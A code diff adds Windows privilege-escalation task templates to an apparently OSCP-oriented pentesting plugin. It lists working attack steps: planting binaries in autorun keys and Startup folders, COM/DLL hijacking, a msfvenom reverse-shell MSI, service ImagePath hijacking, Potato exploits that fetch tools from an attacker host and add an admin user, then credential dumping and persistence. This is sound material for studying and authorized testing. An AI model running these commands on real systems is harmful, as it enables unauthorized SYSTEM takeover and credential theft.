@@ -1852,3 +1852,320 @@ class WindowsPrivescPlugin(ServicePlugin):
                 }
             ]
         }
+
+    def _get_autorun_privesc_tasks(self, target: str) -> Dict[str, Any]:
+        """Generate autorun-based privilege escalation tasks"""
+        return {
+            'id': 'autorun-privesc',
+            'name': 'Autorun & Startup Persistence Exploitation',
+            'type': 'parent',
+            'children': [
+                {
+                    'id': 'autorun-registry',
+                    'name': 'Check Autorun Registry Keys',
+                    'type': 'command',
+                    'metadata': {
+                        'command': 'reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"',
+                        'description': 'Check HKLM autorun registry keys for privilege escalation',
+                        'tags': ['OSCP:HIGH', 'PERSISTENCE', 'QUICK_WIN'],
+                        'flag_explanations': {
+                            'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run': 'System-wide autorun keys (requires admin to modify)'
+                        },
+                        'success_indicators': [
+                            'Registry entries found',
+                            'Writable autorun entries discovered',
+                            'Paths with weak permissions'
+                        ],
+                        'failure_indicators': [
+                            'Access denied',
+                            'No autorun entries',
+                            'All paths properly secured'
+                        ],
+                        'next_steps': [
+                            'Check HKCU autorun keys: reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"',
+                            'Test write permissions: icacls "C:\\path\\to\\executable.exe"',
+                            'Replace with malicious binary if writable',
+                            'Check Startup folder: dir "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'
+                        ],
+                        'alternatives': [
+                            'Manual registry editor check',
+                            'PowerShell: Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
+                            'Autoruns.exe from Sysinternals',
+                            'WinPEAS autorun check'
+                        ],
+                        'notes': 'Autorun entries execute at user login. HKLM requires admin, HKCU does not.'
+                    }
+                },
+                {
+                    'id': 'startup-folder-check',
+                    'name': 'Check Startup Folder Permissions',
+                    'type': 'command',
+                    'metadata': {
+                        'command': 'icacls "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"',
+                        'description': 'Check if Startup folder is writable by current user',
+                        'tags': ['OSCP:HIGH', 'PERSISTENCE'],
+                        'success_indicators': [
+                            'Write permissions found',
+                            'Successfully placed payload in Startup folder',
+                            'Payload executes on next login'
+                        ],
+                        'failure_indicators': [
+                            'No write access',
+                            'Folder does not exist',
+                            'AV blocks payload placement'
+                        ],
+                        'next_steps': [
+                            'If writable: copy malicious.exe "Startup\\update.exe"',
+                            'Trigger reboot or wait for user login',
+                            'Check user Startup folder: %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
+                            'Combine with SeImpersonatePrivilege to escalate on execution'
+                        ],
+                        'alternatives': [
+                            'Check user Startup: dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"',
+                            'Registry approach: reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Update /t REG_SZ /d "C:\\path\\to\\malicious.exe"'
+                        ]
+                    }
+                }
+            ]
+        }
+
+    def _get_com_hijacking_tasks(self, target: str) -> Dict[str, Any]:
+        """Generate COM hijacking privilege escalation tasks"""
+        return {
+            'id': 'com-hijacking',
+            'name': 'COM Hijacking & DLL Search Order',
+            'type': 'parent',
+            'children': [
+                {
+                    'id': 'com-enum',
+                    'name': 'Enumerate COM Objects',
+                    'type': 'command',
+                    'metadata': {
+                        'command': 'reg query HKCR\\CLSID /s /f "InprocServer32"',
+                        'description': 'Find COM objects that load DLLs from user-controlled paths',
+                        'tags': ['OSCP:MEDIUM', 'ADVANCED'],
+                        'success_indicators': [
+                            'COM objects found',
+                            'DLL paths in user-writable locations',
+                            'Missing DLLs that can be hijacked'
+                        ],
+                        'failure_indicators': [
+                            'All DLLs in system directories',
+                            'No user-writable paths',
+                            'Access denied'
+                        ],
+                        'next_steps': [
+                            'Look for DLL paths under %LOCALAPPDATA% or %TEMP%',
+                            'Check if DLL exists: dir "C:\\path\\to\\dll"',
+                            'If missing: create malicious DLL with same name',
+                            'Compile DLL: x86_64-w64-mingw32-gcc -shared -o hijack.dll hijack.c'
+                        ],
+                        'alternatives': [
+                            'PowerShell: Get-ChildItem HKLM:\\Software\\Classes\\CLSID -Recurse',
+                            'Process Monitor (procmon.exe) to track DLL loads',
+                            'SharpUp.exe for automated COM hijacking checks'
+                        ],
+                        'notes': 'COM hijacking requires understanding of DLL search order and COM registration'
+                    }
+                }
+            ]
+        }
+
+    def _get_msi_exploitation_tasks(self, target: str) -> Dict[str, Any]:
+        """Generate MSI installer privilege escalation tasks"""
+        return {
+            'id': 'msi-exploitation',
+            'name': 'MSI AlwaysInstallElevated Exploitation',
+            'type': 'parent',
+            'children': [
+                {
+                    'id': 'msi-check',
+                    'name': 'Check AlwaysInstallElevated Policy',
+                    'type': 'command',
+                    'metadata': {
+                        'command': 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
+                        'description': 'Check if AlwaysInstallElevated is enabled (both HKLM and HKCU must be 1)',
+                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'EXPLOIT'],
+                        'success_indicators': [
+                            'Both registry keys exist',
+                            'Both set to 0x1',
+                            'MSI installers will run with SYSTEM privileges'
+                        ],
+                        'failure_indicators': [
+                            'Keys do not exist',
+                            'One or both set to 0x0',
+                            'Access denied'
+                        ],
+                        'next_steps': [
+                            'If enabled: Create malicious MSI with msfvenom',
+                            'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o privesc.msi',
+                            'Transfer MSI to target',
+                            'Execute: msiexec /quiet /qn /i privesc.msi',
+                            'Alternative: Use WiX Toolset to create custom MSI'
+                        ],
+                        'alternatives': [
+                            'Manual registry check in regedit',
+                            'PowerShell: Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"',
+                            'WinPEAS AlwaysInstallElevated check',
+                            'Create MSI with custom actions for persistence'
+                        ],
+                        'notes': 'AlwaysInstallElevated is a dangerous misconfiguration. MSI runs as SYSTEM regardless of user privileges.'
+                    }
+                }
+            ]
+        }
+
+    def _get_service_registry_abuse_tasks(self, target: str) -> Dict[str, Any]:
+        """Generate service registry abuse privilege escalation tasks"""
+        return {
+            'id': 'service-registry-abuse',
+            'name': 'Service Registry Modification Abuse',
+            'type': 'parent',
+            'children': [
+                {
+                    'id': 'service-reg-perms',
+                    'name': 'Check Service Registry Permissions',
+                    'type': 'command',
+                    'metadata': {
+                        'command': 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services',
+                        'description': 'Enumerate services and check if registry keys are writable',
+                        'tags': ['OSCP:HIGH', 'SERVICES'],
+                        'success_indicators': [
+                            'Service registry keys found',
+                            'User has write access to service ImagePath',
+                            'Can modify service parameters'
+                        ],
+                        'failure_indicators': [
+                            'No write access',
+                            'All services properly secured',
+                            'Access denied'
+                        ],
+                        'next_steps': [
+                            'For each service, check permissions: Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\<ServiceName>',
+                            'If writable: reg add HKLM\\System\\CurrentControlSet\\Services\\<ServiceName> /v ImagePath /t REG_EXPAND_SZ /d "C:\\path\\to\\malicious.exe" /f',
+                            'Restart service: sc stop <ServiceName> && sc start <ServiceName>',
+                            'Or wait for system reboot'
+                        ],
+                        'alternatives': [
+                            'PowerShell: Get-Service | ForEach { Get-Acl "HKLM:\\System\\CurrentControlSet\\Services\\$($_.Name)" }',
+                            'accesschk.exe -kvuqsw HKLM\\System\\CurrentControlSet\\Services',
+                            'SharpUp.exe for automated service checks'
+                        ],
+                        'notes': 'Modifying service ImagePath requires write access to service registry key. Service must be startable.'
+                    }
+                }
+            ]
+        }
+
+    def _get_potato_extended_tasks(self, target: str) -> Dict[str, Any]:
+        """Generate extended Potato-family exploit tasks"""
+        return {
+            'id': 'potato-extended',
+            'name': 'Potato-Family Exploits (Extended)',
+            'type': 'parent',
+            'children': [
+                {
+                    'id': 'juicy-potato',
+                    'name': 'JuicyPotato (Windows Server 2016 and older)',
+                    'type': 'manual',
+                    'metadata': {
+                        'description': 'Use JuicyPotato for SYSTEM via SeImpersonatePrivilege',
+                        'alternatives': [
+                            'Requirements: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege',
+                            'Download: https://github.com/ohpe/juicy-potato/releases',
+                            'Transfer to target: certutil -urlcache -split -f http://<LHOST>/JuicyPotato.exe jp.exe',
+                            'Find CLSID for OS: https://ohpe.it/juicy-potato/CLSID/',
+                            'Execute: jp.exe -t * -p "C:\\Windows\\System32\\cmd.exe" -a "/c net user hacker Hacker123! /add && net localgroup administrators hacker /add" -l 1337 -c {CLSID}',
+                            'Alternative payload: Reverse shell or enable RDP'
+                        ],
+                        'success_indicators': [
+                            'Exploit succeeds',
+                            'Command executes as SYSTEM',
+                            'New admin user created',
+                            'Reverse shell received as SYSTEM'
+                        ],
+                        'failure_indicators': [
+                            'CLSID not working (try different CLSID)',
+                            'SeImpersonatePrivilege not held',
+                            'Windows 10/Server 2019+ (use RoguePotato instead)'
+                        ],
+                        'next_steps': [
+                            'Verify SYSTEM: whoami',
+                            'Dump credentials: mimikatz, procdump',
+                            'Extract SAM/SYSTEM hives',
+                            'Establish persistence'
+                        ],
+                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'POTATO'],
+                        'notes': 'JuicyPotato patched in Windows 10 1809+ and Server 2019+. Use RoguePotato for newer systems.'
+                    }
+                },
+                {
+                    'id': 'rogue-potato',
+                    'name': 'RoguePotato (Windows 10/Server 2019+)',
+                    'type': 'manual',
+                    'metadata': {
+                        'description': 'Use RoguePotato for SYSTEM on patched systems',
+                        'alternatives': [
+                            'Requirements: SeImpersonatePrivilege',
+                            'Download: https://github.com/antonioCoco/RoguePotato/releases',
+                            'Setup socat relay on attacker: sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET>:9999',
+                            'Transfer RoguePotato.exe to target',
+                            'Execute: RoguePotato.exe -r <LHOST> -e "cmd.exe /c whoami" -l 9999',
+                            'For reverse shell: -e "C:\\path\\to\\reverse.exe"'
+                        ],
+                        'success_indicators': [
+                            'Exploit succeeds',
+                            'Command executes as SYSTEM',
+                            'Reverse shell as SYSTEM'
+                        ],
+                        'failure_indicators': [
+                            'socat relay fails',
+                            'Port 135 not accessible from target',
+                            'SeImpersonatePrivilege not held'
+                        ],
+                        'next_steps': [
+                            'Verify SYSTEM context',
+                            'Dump LSASS',
+                            'Extract hashes',
+                            'Pivot to other systems'
+                        ],
+                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'POTATO'],
+                        'notes': 'RoguePotato works on systems where JuicyPotato is patched. Requires network relay.'
+                    }
+                },
+                {
+                    'id': 'god-potato',
+                    'name': 'GodPotato (Windows Server 2012-2022)',
+                    'type': 'manual',
+                    'metadata': {
+                        'description': 'Use GodPotato for SYSTEM with minimal requirements',
+                        'alternatives': [
+                            'Requirements: SeImpersonatePrivilege',
+                            'Download: https://github.com/BeichenDream/GodPotato/releases',
+                            'Transfer to target',
+                            'Execute: GodPotato.exe -cmd "cmd /c whoami"',
+                            'For reverse shell: GodPotato.exe -cmd "C:\\path\\to\\reverse.exe"',
+                            'Simplest Potato variant - no CLSID or relay needed'
+                        ],
+                        'success_indicators': [
+                            'Command executes as SYSTEM',
+                            'No network relay required',
+                            'Works on latest Windows Server'
+                        ],
+                        'failure_indicators': [
+                            'Exploit fails',
+                            'SeImpersonatePrivilege not held',
+                            'AV blocks execution'
+                        ],
+                        'next_steps': [
+                            'Add admin user',
+                            'Enable RDP',
+                            'Dump credentials',
+                            'Establish persistence'
+                        ],
+                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'POTATO', 'QUICK_WIN'],
+                        'notes': 'GodPotato is the newest and simplest Potato variant. Works on Server 2022.'
+                    }
+                }
+            ]
+        }
